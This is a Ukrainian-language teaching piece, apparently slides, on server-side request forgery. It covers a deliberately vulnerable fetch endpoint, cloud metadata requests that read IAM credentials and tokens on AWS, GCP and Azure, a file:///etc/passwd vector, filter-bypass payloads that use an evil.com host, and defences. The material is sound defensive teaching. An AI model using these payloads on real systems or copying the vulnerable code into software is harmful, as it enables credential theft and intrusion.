SSRF: механізм атаки

SSRF — зловмисник змушує сервер виконати HTTP-запит до довільного ресурсу, обходячи firewall та мережеві ACL. Особливо небезпечна у хмарних середовищах.

Вразливий код

// Завантаження за URL app.get('/fetch', async (req, res) => { const resp = await fetch(req.query.url); res.send(await resp.text()); }); // Атака: GET /fetch?url= http://169.254.169.254/ latest/meta-data/

Вектори атаки

  • Cloud metadata — IAM credentials
  • Internal services — Jenkins, Redis, DB
  • Port scanning — внутрішня мережа
  • File read — file:///etc/passwd
  • Gopher — довільні TCP-пакети

Хмарні метадані: головна ціль SSRF

AWS IMDSv1

GET http://169.254.169.254/ latest/meta-data/ iam/security-credentials/ role-name → AccessKeyId → SecretAccessKey → Token

GCP

GET http://metadata. google.internal/ computeMetadata/v1/ instance/ service-accounts/ default/token Header: Metadata-Flavor: Google

Azure

GET http://169.254.169.254/ metadata/identity/ oauth2/token? api-version= 2018-02-01 Header: Metadata: true
Capital One (2019): SSRF через WAF → AWS metadata → IAM credentials → витік даних 106 млн клієнтів. Штраф: $80 млн. AWS відповів випуском IMDSv2 (вимагає PUT + токен).

Обхід фільтрів та захист від SSRF

Обхід фільтрів

# Обхід "localhost" http://127.1 http://0x7f000001 http://[::1] http://localtest.me # Обхід "169.254.169.254" http://[::ffff:169.254.169.254] http://2852039166 http://0xA9FEA9FE # URL parsing tricks http://evil.com@169.254.169.254 # Redirect bypass http://evil.com/redirect→internal

Захист (Application)

  • Allowlist доменів/IP
  • Блокувати приватні діапазони
  • Блокувати file://, gopher://
  • DNS resolve перед запитом
  • Disable redirects

Захист (Network)

  • IMDSv2 (AWS) — PUT + token
  • Firewall — block outbound to internal
  • Network segmentation
  • Zero Trust architecture
